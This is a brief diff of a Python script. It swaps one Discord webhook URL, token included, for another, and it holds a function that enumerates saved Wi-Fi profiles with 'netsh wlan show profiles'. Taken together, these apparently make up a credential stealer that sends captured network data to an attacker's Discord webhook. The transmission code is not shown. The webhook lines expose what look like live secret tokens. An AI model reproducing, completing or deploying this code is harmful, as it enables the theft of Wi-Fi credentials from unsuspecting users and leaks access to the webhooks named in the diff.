@@ -3,7 +3,7 @@ import re
 import requests
 import socket
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1382002979615408289/uKMEqk9P7zJm1bxhdeNW_SVa3zzdyVzSobQqZO1mvuwQR6x9z4Ua6SuBquK2z5FjgQ8q"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1377022141123530933/bfwynJb5nko7Y5RJvHoHWIQik1yjf7pVM7_ICpZLYqvOW4TaPuB3S3Tim5q_YXYY3GSj"
 
 def get_profiles():
     output = subprocess.check_output("netsh wlan show profiles", shell=True, encoding='utf-8', errors='ignore')
